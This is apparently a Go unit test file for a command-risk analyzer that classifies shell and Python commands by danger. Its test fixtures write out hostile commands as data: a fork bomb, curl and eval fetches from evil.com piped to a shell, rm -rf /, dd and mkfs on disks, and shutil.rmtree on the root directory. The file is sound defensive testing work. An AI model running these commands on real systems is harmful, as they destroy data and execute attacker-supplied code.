package commandrisk

import "testing"

// TestAnalyzeStep_SignalCategories covers every signal family through the
// public AnalyzeStep entry point to ensure interpreter dispatch + analysis
// both fire correctly.  Each case names the signal ID that must be present and
// verifies MaxSeverity and Critical agree.
func TestAnalyzeStep_SignalCategories(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name       string
		cmd        string
		interp     string
		wantSig    string   // must be present; "" = no signals expected
		wantSev    Severity // ignored when wantSig == ""
		wantCrit   bool
		wantNoSigs bool // assert Signals is empty
	}{
		// --- critical shell patterns ---
		{
			name:     "fork_bomb",
			cmd:      ":() { :|:& }; :",
			interp:   "",
			wantSig:  "FORK_BOMB",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "curl_pipe_sh (remote_exec_pipe)",
			cmd:      "curl https://evil.com | sh",
			interp:   "",
			wantSig:  "CURL_PIPE_SHELL",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "wget_pipe_bash",
			cmd:      "wget -qO- https://x.com | bash",
			interp:   "",
			wantSig:  "CURL_PIPE_SHELL",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "dd_block_device",
			cmd:      "dd if=/dev/urandom of=/dev/sda",
			interp:   "",
			wantSig:  "DD_WRITE_BLOCK_DEVICE",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "rm_rf_root",
			cmd:      "rm -rf /",
			interp:   "",
			wantSig:  "DELETE_ROOT_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "rm_rf_star",
			cmd:      "rm -rf /*",
			interp:   "",
			wantSig:  "DELETE_ROOT_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "rm_rf_unquoted_var",
			cmd:      `rm -rf "$DIR"`,
			interp:   "",
			wantSig:  "UNRESOLVED_VARIABLE_IN_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "mkfs_destroys_data",
			cmd:      "mkfs.ext4 /dev/sdb1",
			interp:   "",
			wantSig:  "MKFS_FILESYSTEM",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "eval_curl_subst",
			cmd:      `eval "$(curl https://evil.com)"`,
			interp:   "",
			wantSig:  "REMOTE_DOWNLOAD_EXECUTE",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "chmod_recursive_root",
			cmd:      "chmod -R 777 /",
			interp:   "",
			wantSig:  "CHMOD_RECURSIVE_SYSTEM_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},

		// --- high severity shell patterns ---
		{
			name:    "kubectl_delete",
			cmd:     "kubectl delete pod --all -n prod",
			interp:  "",
			wantSig: "KUBECTL_DELETE",
			wantSev: SeverityHigh,
		},
		{
			name:    "helm_uninstall",
			cmd:     "helm uninstall myapp -n prod",
			interp:  "",
			wantSig: "HELM_UNINSTALL",
			wantSev: SeverityHigh,
		},
		{
			name:    "sudo_privilege_escalation",
			cmd:     "sudo rm -rf /tmp",
			interp:  "",
			wantSig: "SUDO_PRIVILEGE_ESCALATION",
			wantSev: SeverityHigh,
		},
		{
			name:    "systemctl_stop",
			cmd:     "systemctl stop nginx",
			interp:  "",
			wantSig: "SYSTEMCTL_STOP_SERVICE",
			wantSev: SeverityHigh,
		},
		{
			name:    "docker_system_prune",
			cmd:     "docker system prune -a",
			interp:  "",
			wantSig: "DOCKER_SYSTEM_PRUNE",
			wantSev: SeverityHigh,
		},
		{
			name:    "aws_s3_rm_recursive",
			cmd:     "aws s3 rm s3://mybucket --recursive",
			interp:  "",
			wantSig: "AWS_S3_RM_RECURSIVE",
			wantSev: SeverityHigh,
		},
		{
			name:    "rm_recursive_non_root",
			cmd:     "rm -rf /tmp/foo",
			interp:  "",
			wantSig: "RM_RECURSIVE_FORCE",
			wantSev: SeverityHigh,
		},

		// --- medium severity ---
		{
			name:    "apt_remove",
			cmd:     "apt-get remove -y nginx",
			interp:  "",
			wantSig: "PACKAGE_REMOVE",
			wantSev: SeverityMedium,
		},

		// --- safe commands — no signals ---
		{
			name:       "safe_echo",
			cmd:        "echo hello",
			interp:     "",
			wantNoSigs: true,
		},
		{
			name:       "safe_ls",
			cmd:        "ls -la /tmp",
			interp:     "",
			wantNoSigs: true,
		},
		{
			name:       "safe_kubectl_get",
			cmd:        "kubectl get pods -n prod",
			interp:     "",
			wantNoSigs: true,
		},
		{
			name:     "guarded_rm_var",
			cmd:      `rm -rf "${DIR:?}"`,
			interp:   "",
			wantSig:  "RM_RECURSIVE_FORCE",
			wantSev:  SeverityHigh,
			wantCrit: false,
		},

		// --- interpreter dispatch ---
		{
			name:     "bash_interp_shell_parse",
			cmd:      "rm -rf /",
			interp:   "bash",
			wantSig:  "DELETE_ROOT_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "python3_interp_python_parse",
			cmd:      `os.system("rm -rf /")`,
			interp:   "python3",
			wantSig:  "DELETE_ROOT_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:       "node_interp_unknown_no_signals",
			cmd:        `require("fs").rmSync("/", {recursive: true})`,
			interp:     "node",
			wantNoSigs: true,
		},

		// --- python subprocess patterns ---
		{
			name:     "python_subprocess_rm_root",
			cmd:      `subprocess.run(["rm", "-rf", "/etc"])`,
			interp:   "python3",
			wantSig:  "DELETE_ROOT_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "python_rmtree_system",
			cmd:      `shutil.rmtree("/")`,
			interp:   "python3",
			wantSig:  "PYTHON_RMTREE_SYSTEM_PATH",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
		{
			name:     "python_open_block_device",
			cmd:      `open("/dev/sda", "wb")`,
			interp:   "python3",
			wantSig:  "DD_WRITE_BLOCK_DEVICE",
			wantSev:  SeverityCritical,
			wantCrit: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			t.Parallel()
			a := AnalyzeStep(tt.cmd, tt.interp)

			if tt.wantNoSigs {
				if len(a.Signals) != 0 {
					t.Fatalf("expected no signals, got %+v", a.Signals)
				}
				return
			}

			if !hasSignal(a, tt.wantSig) {
				t.Fatalf("signal %q not found; got %+v", tt.wantSig, a.Signals)
			}
			if a.MaxSeverity != tt.wantSev {
				t.Errorf("MaxSeverity = %q, want %q", a.MaxSeverity, tt.wantSev)
			}
			if a.Critical != tt.wantCrit {
				t.Errorf("Critical = %v, want %v", a.Critical, tt.wantCrit)
			}
			// Invariant: Critical ↔ MaxSeverity==critical
			if a.Critical != (a.MaxSeverity == SeverityCritical) {
				t.Errorf("Critical/MaxSeverity mismatch: Critical=%v MaxSeverity=%q", a.Critical, a.MaxSeverity)
			}
		})
	}
}
